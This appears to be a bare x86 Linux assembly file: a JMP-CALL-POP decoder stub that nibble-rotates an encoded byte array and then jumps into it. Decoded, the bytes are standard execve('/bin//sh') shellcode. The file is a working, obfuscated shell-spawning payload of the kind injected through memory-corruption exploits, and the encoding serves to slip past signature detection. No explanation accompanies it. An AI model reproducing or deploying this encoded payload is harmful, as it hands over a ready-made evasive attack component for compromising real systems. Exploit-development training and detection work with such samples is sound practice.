global _start

section .text
_start:

    jmp short call_decoder

decoder:

    pop esi
 


decode:
    
    xor eax, eax
    xor ebx, ebx
    mov al, byte [esi]
    ror al, 4
    mov byte [esi], al
    
    lea esi, [esi + 1]
    mov bl, [esi]
    cmp bl, 0xaa
    je short Shellcode
    jmp short decode
    
  
call_decoder:

    call decoder
    Shellcode: db 0x13,0x0c,0x05,0x86,0xf2,0xf2,0x37,0x86,0x86,0xf2,0x26,0x96,0xe6,0x98,0x3e,0x05,0x98,0x2e,0x35,0x98,0x1e,0x0b,0xb0,0xdc,0x08,0xaa
